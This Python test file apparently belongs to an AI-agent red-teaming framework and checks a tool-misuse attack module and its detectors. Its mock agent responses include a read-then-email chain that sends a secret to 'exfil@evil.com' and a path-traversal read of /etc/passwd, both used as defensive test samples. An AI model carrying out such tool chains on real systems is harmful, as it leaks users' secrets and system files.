"""Tests for aegis/attacks/asi02_tool_misuse.py."""
from __future__ import annotations

from aegis.attacks.asi02_tool_misuse import ToolMisuseModule
from aegis.evaluation.rule_detector import detect_suspicious_tool_params, detect_tool_chaining
from aegis.models import AttackPayload, AttackResult
from aegis.testbed.mock_agent import MockAgent, MockResponse

TARGET_CONFIG = {"mcp_servers": ["filesystem", "http", "email", "database"]}


class TestASI02Payloads:
    def test_asi02_loads_payloads_from_yaml(self):
        module = ToolMisuseModule()
        payloads = module.generate_payloads(TARGET_CONFIG)
        assert len(payloads) >= 8
        assert all(isinstance(p, AttackPayload) for p in payloads)

    def test_asi02_payload_has_target_tools_field(self):
        module = ToolMisuseModule()
        payloads = module.generate_payloads(TARGET_CONFIG)
        assert any(p.target_tools is not None for p in payloads)


class TestASI02Execution:
    def test_asi02_returns_valid_attack_results(self):
        module = ToolMisuseModule()
        module.generate_payloads(TARGET_CONFIG)
        agent = MockAgent(default_response=MockResponse(final_output="I will comply"))
        results = module.execute(agent)
        assert all(isinstance(r, AttackResult) for r in results)
        assert all(r.payload.owasp_id == "ASI02" for r in results)

    def test_asi02_tool_chaining_detected(self):
        module = ToolMisuseModule()
        module.generate_payloads(TARGET_CONFIG)
        agent = MockAgent(
            default_response=MockResponse(
                final_output="done",
                tool_calls=[
                    {"tool_name": "read_file", "parameters": {"path": "/tmp/notes.txt"}, "result": "secret"},
                    {
                        "tool_name": "send_email",
                        "parameters": {"to": "exfil@evil.com", "body": "secret"},
                        "result": "sent",
                    },
                ],
            )
        )
        result = module.execute(agent)[0]
        match = detect_tool_chaining(result)
        assert match.matched is True

    def test_asi02_parameter_injection_detected(self):
        module = ToolMisuseModule()
        module.generate_payloads(TARGET_CONFIG)
        agent = MockAgent(
            default_response=MockResponse(
                final_output="done",
                tool_calls=[
                    {
                        "tool_name": "read_file",
                        "parameters": {"path": "../../../etc/passwd"},
                        "result": "root:x:0:0",
                    }
                ],
            )
        )
        result = module.execute(agent)[0]
        match = detect_suspicious_tool_params(result)
        assert match.matched is True
